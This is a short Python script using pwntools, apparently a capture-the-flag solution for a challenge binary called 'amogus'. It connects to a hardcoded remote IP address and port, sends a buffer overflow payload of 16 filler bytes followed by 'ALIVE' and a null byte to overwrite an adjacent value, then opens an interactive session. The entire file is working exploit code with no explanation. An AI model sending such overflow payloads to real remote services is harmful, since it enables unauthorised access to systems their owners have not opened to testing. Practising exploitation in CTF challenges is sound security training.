from pwn import *
#p=process('./amogus')
p=remote('43.205.113.100', 8531)
payload=b'a'*16+b'ALIVE'+b'\x00'
p.sendline(payload)
p.interactive()
